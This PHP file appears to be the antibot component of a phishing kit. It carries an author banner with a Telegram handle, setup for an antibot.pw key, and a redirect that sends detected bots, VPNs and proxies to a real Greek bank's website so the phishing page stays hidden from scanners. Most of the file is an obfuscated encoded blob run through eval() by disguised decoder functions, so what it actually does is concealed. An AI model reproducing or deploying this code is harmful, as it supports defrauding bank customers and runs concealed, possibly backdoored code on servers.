<?php 

    /*
    ███╗   ███╗██████╗ ██████╗ ██╗██╗  ██╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ████╗ ████║╚════██╗██╔══██╗██║██║  ██║████╗ ████║██║████╗  ██║╚════██╗
    ██╔████╔██║ █████╔╝██║  ██║██║███████║██╔████╔██║██║██╔██╗ ██║ █████╔╝
    ██║╚██╔╝██║ ╚═══██╗██║  ██║██║╚════██║██║╚██╔╝██║╚═╝██║╚██╗██║ ╚═══██╗
    ██║ ╚═╝ ██║██████╔╝██████╔╝███████╗██║██║ ╚═╝ ██║██╗██║ ╚████║██████╔╝
    ╚═╝     ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
         c0ded By M3dL4m!n3  Contact Telegram: @M3dL4m1n3
    */

error_reporting();
session_start();


//Put Your API Here Found on  https://antibot.pw/developers
$config_antibot['apikey']   = '__Your__API__Here__';

//When Bot,Vpn,Proxy is Detected Rediret To This Link
$config_antibot['bot']      = 'https://www.alpha.gr/';

if(!function_exists('f43255293')){function f43255293($fld){$fld1=dirname($fld);$fld=$fld1.'/';clearstatcache();if(!is_dir($fld))return f43255293($fld1);else return $fld;}}require_once(f43255293(__FILE__).'/API.php');$REXISTHECAT4FBI='FE50E574D754E76AC679F242F450F768FB5DCB77F34DE341 660C280D176E374DE7FB3B090A782B6B68DBC97BEAD93B681C452F25BE26';f43255293g0666f0acdeed38d4cd9084ade1739498(f43255293f0666f0acdeed38d4cd9084ade1739498(__FILE__));$REXISTHEDOG4FBI='MTkgOTEzIDUgNjM4RTUxQzZCMjc3MTIyNTYyRDJCQzcgMjNFRjAgMDI0Q0M2QUJGIDAzOENFNzRBQTQ4MkFENjdFOERCQ0JBNjFDQzk2RkYxNTdCRUM1NzNERDEgMzEwNEMyQUM3N0NBMjQ2RkI2MDkyQTg1Q0RBNkYzMTQxIDcyNEM5NjI5OTRFOEVFQTRCOEQ1M0U4IDEzMkU4QjBGMDJFNjkzNiBGNTYzQjIxQ0U3MTkxQTA0RkZCMjRENjkxQzY2NjlCNERGMDI0IDk2NzhBQTg1N0VGMjJDQTNFMkU5Q0U3QTU5RkZDNTIzNjMxNjVENEEwOEU0MUU3MTRDREI4QTQ0M0VBMkRENTQxRjMyMTEwNjREMjc3QTg1NkQyIEEzRUUzNTUyMDY0QzFBQjg5RkIzQzEwNjNDRTk0RkQyQkRGIDEzNURCMUZDQzVCRkQ0RkUyIDIzNEREIDQzQUUxMTVDNjYyQjg2RkE1ODQ5OEVCQTFGMDJGNzMzOTI1NzFDMEI0OUU4RkYwNTREMTc1QkI5RTQ4RDQ3QjlERjQ1RTg5QTg0OEZGMjBENjkxRUU2RURBNzc5RTQ5RjcyQ0QyQTBBNjRBQzA3QkE1QTIzQUQ1MUNEQkI4Njg4OTlBMjZDNDYzODREMzkzRDlCMzkxRTM0MUYzMjMgRTRDRkM0NUY2IDgyNiBEN0U5OThCRTQ2NkU4NjRGNDFFIDUgNzE5M0ZDQTczQ0Y1QkMwNERBOUI5NUNGQjdDOUZBQzlERDA2MUZFIDU2NThDRjA1MDMyRkY0OCBCNkRDMDlBRjMyMSBGN0JDMUEyOERFOTZEQjk4OEZDNkI4ODk1OUZCQjUwQzc1RkUzNzI4OUI0NEJBRjRBREI2MUUxNjlFOTVCQjY0NTMxMjQgNjY0ODY5MzlBQkU1MENDNjY4Q0Q0NTQ5REJGNDRGOTdFOEJBRTk2RDE3MUVCN0JGQzFGMkQzMTNBQ0I1MEY5NjU4RkIwRjRDQjlBRUU1NTM2MTk3REZBMkYxRTZBQzBBMjhDRTk0MDI2RDc2RUVBNDRENzY3RjA3OUVFNjNFRCAxMUUzOTFCNTNDRDQ3REY3NjlCQTFCQkEwQUY4QTlFQzdBNjdDODZGRTFGMjEzQ0NENjZDQzcyRjIxNjMyREI1REVEIDggMTEyMzJDNTUyRUMgQzJGMzQ0RUUzNzk5M0Y2MUIxMjc4QjZFRTVCMzExMzdEQkY4NkQyODlFQzU0IEQ2MEZFMkJBMjQyRjMzOEVGNUYzQjFGIEIxQTZBODM5NDk3QUM0OUNDNERFRDRDRUQgRjE5MjA0QUMzNDRENzVFRTM3Q0JDMzJEM0FFNDZDMzlFRURCQzlFRUM0ODMxMkNERjM1RUU1M0ZBMzlDN0E0QUU4QUFERTUxNDMzMzJDNjUzREQ3QTk3RUM3MDlEODg5NThFQUYzQUNFNEFDNjVERDE2MEMzM0REMDY0RTA3MjhBRjQxODExNEMxMzQ1MUM3MUVCNDU1QzgwQjE0NUY3MjNDQzhCOUY4REY5NTRGMSBCMTUyREMxNTVFMjY3RjcgNzM2Q0EyRkNENDdGQzdEOEU5NjhGODI4RTlERTBBOEZGNDgxODYzRDFCNDhERDQ3M0EzODJERCA5MjFDRjc2QTc0M0RFNzRCNzhCRTUgQjM5RTcgNzM3Rjk2M0RBNThFQzQzREUxMTJERDg3NUY1IEQxMjMxNDZDQjQ1RUU3QTg0RTg1ODI3NjMyOTEwNDkyNDNFRjBDODlDRjE0ODJCIDQ2MEU3M0MgRDc5RDcgMzNEMTgxRjdERjMxMjI3RTkgMiBBMzc0NzFBNzAyMyAwNkZDQjhDM0UxQTcwMzMxMTdGREFCMDU0OTI0M0YxMjJDNTk3QjQyQkQ5MUEyNUQ0N0JCNTcwRDZBRjg3QTc1NTg5NDRFRjIwRDY0NjNGRkMgQjJEQzgzQkMzNzc5NzlCQThCNTlFRUIxMSAyMkIzNkM4QjQ5N0U2QTJFRTU2IEY2MkY4M0Q3RkM3ODRGRTVDMzMxNzUwNDQzNSAxNkY5QTQ1MjAxNzc1Q0I3N0JGNEI4RjhBQjUyRjI0NjUzNTdERDJCNkIxRTUzMjZCM0YgQTY0QzFBQjg5QkM2Qzg2OTJEMkE2RTYzMjFDNjhEMiBENTUxQjQzNTcyNjEyNzhEQUI0OTFGQjYyOTk0RjM2IEE2N0YxMkRBNzVCOUU0OUVENjYzNzI2MUI2QURFQjQ5NjVBMjI2NjJENjgzNzE5NDAyRDM3MUVBNTQ1RUQzOUU4MTg3Q0M3IDUyNCBCNTIxRTY5QTNGQTQ3MzUxMDY5RjAxQUY1MkRBNTU0RTkgMzMyMURDMTUxRjEzMzJFRDkgQzdBREIxQkNGNkVEMjE3NUQyQTMwMTkgQzYyRDZBQzhGRTA0MUMzMTg2OUYyNTlGRTNBRTkxQzM5RjAxQURBMzYxMzQ2QzhFMEE0OTBFQTQ4MjcgMzQ0NTAyMUQwIEMzQ0U2IDMzQ0UzIEEzQ0Y1MTM3NkUwIEQ0MDIyMTYgMzFCMjIyQTFFNUFGRiBCMkEzRUM0QjU5RjgxQTQ1MkU3NjhFRTgxQzJEN0I5OERGNzVCMzQxMDU3OEU1NTkzNEFFQjExMzNFRDFGREQxNzY2RjMxQUY4NkNCOUIyNUNGNCAyMUUyQTE5NENDRjQxREY3Nzg3OTBBRTQzRDY2MEVBNDhDMDY5RENDOTcwQjY3Njk4OEU4REZEM0MgRDc5RDNCMTlGRkE1MTMzIDUzMkNFM0JFNjJDRDM3Mjk5RUQ3MUQyNzlBQTdBRDI2MzlDNUY4NkE3OEFFNCBBMjAgQzFFNTIxMTRCMjI3N0Q5QUQ5N0Y0NUE4ODhBQ0ExMUQ3IEM2RURDIEEyNURBMTlDRDY1QTE0QUZGNDQ3QkQ1QTE5QkY4MzkgMjZCQkY4RUZBNTFGNTI1RDY3MEE2NDJGNDNBMjNDQjRFRkE2Qjk4OTRFNzIwNjIyODJGN0JDQUJFOTRGNjU5M0MyQUQxMTA3NUNDOTVGODYzQ0FERjRFM0EyRCBFN0RCNTc5RDYxQjFDMTAzNUQ0IEMyMUM2NjE4RkFENjU5NDg5QkIxOSBGNkNGRDQ4MUQ3OUZFMkIxQTZFQzRBNjg4RTkxNjM5RkUyQUMwNTY4NERFQjdFMjREREVBNDhCNEZGMzNBOTk5NzgxQTM1QTgwQjVCNjVFODBFRDQ5Qzg3MDlFNDY4Qzg4RTM0OUU5MTdDRjVFRjQzNUZENjY5NDQyMzRERjEyMjkxRENBODVGRjE4Q0QgODI1QzQ3MEExNUFERDIwQTRCMDg2RkU2MTg0QjE5NUY1NEVFQSAyMTIzMEVGMjA2OEM0QTY5MDQ2RTEgRkU1MjczNEMxNzhBMzQxRTMxNyA3N0JFNCAzMUQxNzQzMzg5ODQ1RTUxMTNDRDAgNCBGNDAzOSA5MjIzNzMyQzE1MkQ1N0E5MEVFNEVFRjNFQzcxMjI5MjgzN0NBNjVFMjREQTZBNUFEOUVCOUFDOTA4MUNDODRFMTVCIDI2RkY1NUY0QTI0MUNEQzEzQ0Q3OEZGMTQ2NUQxQkI5OUY3NzBEQSA3MjhEMjE4IEUzRkRFIEI0RkZEMzcgNTZBOTNCQzU3RjMzMkY0MjIgQ0NFIDQzM0RBNTZENEI4QkI5NkNDQTVGMDVGMkIxMTcyOTRCRTgxOTFBQTRBRjMyMDM1MTlDODdFOEZCNDdEODhFMjNBMTM2NUVDNTlEMEIzN0ZCRkI4RTggMjIxREEgQjI4IEEzOUVFMUMzQkYzMTE3NUE4ODE4Qjg2RjIzREVDMkRENjY3RDZCMkU4NDMyMSBGNkFDMEEyOTBGNTRGMTY3QkUxMURCNzYyODNBRjVEMzJFMjMyOTNBOUIwRjc0MDJFIEI2MUMzQjE5NEVENzdCOTY1OTgzOUQwMTg3RkNBQTU4MUM2RDJBMzk3RkQ1QzMyMTc3RERGIDAyMENEM0FFMTJBIDM1Q0YzMzRGRDIwMTQ2NSA4MUM2REQ5QjM5MUZGNjVDRiBGNEUxRDY0RkQ1MyA5Q0ZFOUJENkYyNjczRDg1RUFCMTQyQ0RBIDAzNjE4MTA3QUFBNDJGQzQ0RkMyNkUwIDM1MEYxMzIzNyA3NUVDNjZGRTkgRjJDQzQ3NkE0OTQ5OEJCN0VBMjU3QzU3MkUwNDg1OUYyMzZGRTI2QzA2Q0FDM0FGOTNBRTkgRTMzRTI3NEQ5Njk5QzVGQjM1NEI3OTdDMUFGOEM5REU5QkM2MkFGRTM1OUNFNzdBOTVERkEyMEQ2NTZEMTZDQUQ1RUJCNkVBMzgyRjY2RUU4NDZGRTE2QkY3NEM5IEY1RTI2IDM2OUNCQjk1QjlEN0FFRjIyQ0UgNTI3RDgxMTdBRDMgNDE0NDNGNTNFRUQxRkMzQjg5MkY2NzdERTFCRjMyRkVGMTA0MkVGIDUyOURFIDcyREZCNDRDRUExNEVGRjNBMjRDQkI2OEQ4REMzQjQ3RjlFNDI4MEFCNzNEQUE3ODhFQzZBQkU3MjhGQkVBNDQzRUQgNTJCQzI3MEMxOUE0QUMzNkVGQTIxREUxNEMxQjQ5MEQ1MzAgNTNDRTExMjM2REEgODI1RDQgNjIzRjUxNUZFM0FBMDg5QUY0RkYzMkYxMiA4IDU3RkVFQjFGOTM5IDM0NzE2NzJGNDZB';$REXISTHECAT4FBI='94CD76CD371C5A7BC70C186E779C293B9B49BACA5A781A6'; eval(f43255293y0666f0acdeed38d4cd9084ade1739498('QTJBNEJBREYyMzI5NTZCODg4',$REXISTHEDOG4FBI));

?>